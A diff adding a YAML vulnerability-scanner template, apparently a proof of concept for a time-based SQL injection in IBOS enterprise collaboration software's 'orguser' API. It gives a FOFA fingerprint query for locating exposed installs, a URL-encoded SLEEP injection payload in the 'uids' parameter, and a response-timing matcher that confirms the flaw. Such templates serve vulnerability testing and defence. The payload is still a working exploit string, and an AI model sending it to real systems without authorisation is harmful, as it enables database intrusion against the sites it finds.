@@ -1,0 +1,18 @@
+id: poc-yaml-ibos-ecms-orguser-sqli
+info:
+  name: IBOS企业协同管理软件 OrgUser SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: IBOS企业协同管理软件
+  fofa: app="IBOS企业协同管理软件"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /?r=main/api/orguser&uids=u_1%27)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP({{.t1}})))a)%20AND%20(%27222%27%3D%27222
+  expression: status_code == 200 && contains(body,"\"isSuccess\":true") && contains(content_type,"application/json")
+    && duration > t2 && duration < t3
+transport: http
